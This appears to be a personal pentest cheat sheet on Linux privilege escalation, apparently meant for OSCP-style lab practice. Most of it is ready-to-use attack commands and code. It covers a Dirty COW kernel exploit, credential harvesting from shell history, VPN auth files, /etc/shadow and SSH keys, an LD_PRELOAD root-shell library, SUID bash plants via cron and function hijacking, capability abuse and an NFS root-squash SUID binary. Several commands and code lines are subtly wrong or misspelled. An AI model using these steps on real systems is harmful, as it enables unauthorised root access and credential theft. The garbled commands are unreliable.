# Linux Privilege Escalation
## //cheat-sheet

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**

### Resources:

* **[g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)**
* **[hacktricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**
* **[sushant747 OSCP-guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)**

### Automated privesc tools:

* **[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**
* **[linenum](https://github.com/rebootuser/LinEnum)**
* **[linenumsuggester](https://github.com/mzet-/linux-exploit-suggester)**
* **[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)**

### Escalation path: Kernel exploits
#### Kernel exploits are very straight forward. We hunt down what version of kernel is running on the target system and then we exploit it.

* **[resource: lucyoa/kernerl-exploit](https://github.com/lucyoa/kernel-exploits)**

* chek kernel version on target system: `uname -a`
* compile dirty c0w.c first `gcc -phthread c0w.c -o cow`
* use dirty c0w on target machine `./cow`
* c0w output: ***Backing up /usr/bin/passwd to /tmp/bak***
* type in: `passwd` and you're **root**

### Escalation path: Password and file permissions

#### Escalation via stored passwords:

* see history if possible, if someone connected to a mysql database with their credentials for example it will show up in there, use command `history`
* cat out the `cat .bash_history` as well
* you can also try using the ***history*** command with ***grep*** to grep for the password: `histroy | grep passwd`
* `ps aux` to see processes
* `w` to see who's logged in 
* when asked for a password on the system if you see asterisks while typing out the password in terminal that's a very specific version of ***sudo***, that's usually the **.pwfeedback** is being set. **Any sudo before 1.8.6**. Usually Linux Mint and Elementary OS, get sudo version: `sudo -v` **env_reset.pwfeedback** is being reset.
* ***cat*** out the ****.ovpn*** file to check for credentials or references: `cat myvpn.ovpn` shows that the password is coming from the ***/etc/openvpn/auth.txt*** so we can just cat that file out for credentials

#### Escalation via weak file permissions:

* `ls -la /etc/passwd` and `ls -la /etc/shadow` if you can access both and cat them out we can use ***john*** or other similar tools to crack those passwords
* passwd file doesn't have any passwords in it (back in the day it was) , it helps us to ID the users
* **x**  is a placeholder in it for the hash which contains the password from the shadow file
* if we can modify /etc/passwd the x in the file we could become root,
like delete it, if there's no placeholder we can just switch to root user without a password or change it to 0
* we can change the hash to one where we know the password and become root like that

#### Escalation via ssh keys:

* `find / -name authorized_keys 2>/dev/null`
* `find / -name id_rsa 2>/dev/null`
* once the key was found copy it to your machine into a file and don't forget to `chmod 600 id_rsa` to be able to use it to log in via ssh
* `ssh -i id_rsa root@<target IP>`

### Escalation path: sudo

#### Preloading

* it's a feature of LD (dynamic linker)
* we're going to preload a user library by running sudo with ID preload and execute our own library before anything else
* `nano shell.c`
* `#include <stdio.h>`
* `#include <sys/types.h>`
* `#include <stdlib.h>`
* `void_init() {`
* `   unsetenv("LD_PRELOAD");`
* `   setgid(0);`
* `   setuid(0);`
* `   system("/bin/bash");`
* `}`


* don't forget to include tabs with lines: unsetenv, segid, setuid, system
* compile it: `gcc fPIC -shared -o shell.so shell.co -nostartfile`
* ***fPIC is position independent code***, regardless of what your shell address is, it will work
* need full path to ***shell.so***
* run it: `sudo LD_PRELOAD=/home/usr/shell.so apache2`

### Escalation path: SUID

* to hunt it down: `find / -type f -perm -04000 -ls 2>/dev/null`

#### Shared object injection:

* strace is diagnosing, debugging Linux for tampering and monitoring
* `strace /usr/local/bin/suid-so 2>&1`
* grep the output `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`


#### Symbolic link

* symbolic link: any file that contains a reference to another file or directory in a form of an absolute or relative path
* create a function and export it: `function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
* export service: `export -f /usr/sbin/service`
* compile it and change path: `gcc /tmp/service/.c -o /tmp/service` and `export PATH=/tmp:$PATH`

### Escalation path: capabilities

* searching for capabilities: `getcap -r / 2>/dev/null`
* found (ex) : `/usr/bin/python2.6 = cap_setuid+ep`
* execute: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

### Escalation path: scheduled tasks

* **m h dom mon dow user command** /month, hour, day of month, month, day of week, user, command
* `17 * * *` every 17th minutes execute a command for a user
* `* * * * root /user/local/bin/compress.sh`
* `* * * * root overwrite.sh`
* then
* `systemctl list-timers --all`
* add to file that root executes via crontab: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
* wait for crontab to kick in and run: `/tmp/bash -p` and we're root!

* ***note: The -p option in bash and ksh is related to security. It is used to prevent the shell reading user-controlled files.***

* **Another way of overwriting the crontab file is:**
* `cat /usr/local/bin/overwrite.sh`
* `nano /usr/local/bin/overwrite.sh`
* `#!/bin/bash`
* `echo date > /tmp/useless`
* `cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
* now we have overwritten the ***overwrite.sh*** file, now run: `/tmp/bash -p`
* `whoami`
* **root!**

### Escalation via NFS root squashing

* on target machine `cat /etc/exports` shows no root squash but what does this mean? /tmp folder can be mounted from attacking machine!
* `showmount -e <target IP>` results will show up
* `/tm *`
* make a folder on your machine `mkdir /tmp/mountme`
* and mount it: `mount -o rw vers=2 <target IP>:/tmp /tmp/mountme`

* from kali: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`
* compile it: `gcc /tmp/mountme/x.c -o /tmp/mountme/x`
* chande mod: `chmod +x /tmp/mountme/x`
* now cd over to /tmp on target machine and execute `./x`
* we're root!

### Upgrade your shell on target machine

* `python 'import pty;pty.spawn("/bin/bash")'`
* `export TERM=xterm`
* background your shell with **CTRL+Z**
* `ptty raw -echo; fg`

